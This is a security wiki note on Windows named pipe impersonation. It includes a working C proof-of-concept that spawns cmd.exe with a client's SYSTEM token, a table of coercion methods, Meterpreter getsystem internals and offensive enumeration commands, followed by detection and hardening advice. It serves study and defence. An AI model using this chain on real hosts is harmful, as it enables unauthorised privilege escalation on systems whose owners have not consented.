---
title: Named pipe impersonation
slug: named-pipe-impersonation
aliases: [pipe-impersonation, named-pipe-privesc]
---

> **TL;DR:** Create a named pipe server, wait for a privileged process to connect, call `ImpersonateNamedPipeClient` to wear its token, then `DuplicateTokenEx` → `CreateProcessWithTokenW` to spawn as that principal. This is the core mechanism behind PrintSpoofer, Meterpreter's `getsystem`, and most potato exploits.

## What it is
Named pipes are IPC channels on Windows (`\\.\pipe\<name>`). When a client connects, the server thread can call `ImpersonateNamedPipeClient` to adopt the client's security context for the duration of that thread. If the client runs as SYSTEM and the server holds SeImpersonatePrivilege, the server thread becomes SYSTEM. Every potato exploit and Meterpreter's `getsystem` technique 1 are wrappers around this primitive. See [[token-impersonation]] for the broader impersonation model.

## Preconditions

- Code execution with SeImpersonatePrivilege (service accounts, IIS app pools, SQL Server, etc.)
- A privileged process that can be tricked into connecting to your pipe — Spooler, EFS, DCOM activation, or a misconfigured service that reads from a predictable pipe path
- The pipe name must not already exist (first-writer wins the namespace)

## Technique — manual pipe server (C)

Minimal proof-of-concept showing the full chain:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. Create the pipe
    HANDLE hPipe = CreateNamedPipeW(
        L"\\\\.\\pipe\\evilpipe",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 0, NULL);

    printf("[*] Pipe created, waiting for connection...\n");

    // 2. Block until a client connects
    ConnectNamedPipe(hPipe, NULL);
    printf("[+] Client connected!\n");

    // 3. Impersonate the client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        printf("[-] Impersonation failed: %d\n", GetLastError());
        return 1;
    }

    // 4. Get the impersonation token from the current thread
    HANDLE hToken, hPrimary;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

    // 5. Duplicate to a primary token (needed for CreateProcessWithTokenW)
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimary);

    // 6. Spawn a process as the impersonated user
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessWithTokenW(hPrimary, 0, L"C:\\Windows\\System32\\cmd.exe",
        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    printf("[+] Spawned cmd.exe as impersonated user\n");
    RevertToSelf();
    CloseHandle(hPipe);
    return 0;
}
```

The attacker then triggers a SYSTEM service to connect to `\\.\pipe\evilpipe`. The coercion method varies — that is what differentiates potato variants.

## Coercion triggers

| Method | Service | API / command |
|--------|---------|--------------|
| PrintSpoofer | Spooler | `RpcRemoteFindFirstPrinterChangeNotificationEx` with `\\<host>/pipe/evilpipe` |
| Potato family | DCOM/RPC | DCOM activation that marshals an OBJREF pointing to attacker pipe |
| EfsPotato | LSARPC | `EfsRpcOpenFileRaw` with a UNC path to attacker pipe |
| SpoolFool | Spooler | Spooler write-file-on-share, but the share is a local pipe |
| Custom service | Misconfigured svc | Service reads config from a user-writable pipe path |

## Meterpreter getsystem

```
meterpreter> getsystem
```

Technique 1 (`NamedPipeImpersonation`): creates `\\.\pipe\<random>`, spawns a new service via SCM that runs `cmd.exe /c echo > \\.\pipe\<random>`, and the connecting `cmd.exe` runs as SYSTEM because SCM-launched services run as SYSTEM by default. The Meterpreter handler calls `ImpersonateNamedPipeClient` on connect.

Technique 2 uses `ReflectiveDllInjection` into a SYSTEM process instead.

## Common errors

- **ERROR_BAD_IMPERSONATION_LEVEL (1346)**: called `DuplicateTokenEx` with `SecurityDelegation` instead of `SecurityImpersonation` for a local spawn, or `ImpersonateNamedPipeClient` was not called on the correct thread
- **ERROR_PRIVILEGE_NOT_HELD (1314)**: the calling process lacks SeImpersonatePrivilege — verify with `whoami /priv`
- **Pipe name collision**: another process already owns the name — enumerate first with `(Get-ChildItem \\.\pipe\).Name | Select-String evilpipe`
- **RevertToSelf timing**: forgetting to revert after impersonation leaves the thread in the impersonated context, which can cause access-denied on resources the impersonated user cannot reach

## Offensive enumeration

```powershell
# List all named pipes and their owners
Get-ChildItem \\.\pipe\ | ForEach-Object { $_.Name }

# Check which services run as SYSTEM and might connect to pipes
Get-WmiObject Win32_Service | Where-Object { $_.StartName -match "LocalSystem" } |
    Select-Object Name, PathName, State

# Verify our privilege
whoami /priv | Select-String Impersonate
```

## Detection and defence

- **Sysmon events 17/18** (PipeEvent): creation of pipes by unexpected processes, especially service accounts that normally never create them; alert on random or short-lived pipe names from `w3wp.exe`, `sqlservr.exe`, or any non-standard parent
- **Service creation** (event 7045): Meterpreter's `getsystem` creates a short-lived service — alert on transient services with `cmd.exe /c echo` command lines
- **Token manipulation** (event 4688 with token elevation type): SYSTEM-level processes spawned by service accounts
- **Remove SeImpersonatePrivilege** from accounts that do not need it
- **Restrict service creation**: only privileged accounts should be able to install services (SCM ACLs)
- **LSA protection**: RunAsPPL on `lsass.exe` prevents certain token theft paths. See [[lsass-protection-ppl]]

## References

- [ired.team — Windows Named Pipes 101 + Privilege Escalation](https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [itm4n — PrintSpoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) — pipe impersonation via Spooler coercion
- [Microsoft — ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [MITRE ATT&CK T1134.001](https://attack.mitre.org/techniques/T1134/001/) — Token Impersonation/Theft

See also: [[token-impersonation]], [[potato-exploits]], [[tokens-and-privileges]], [[sedebug-privilege-abuse]], [[lsass-protection-ppl]], [[windows-privesc-checklist]]
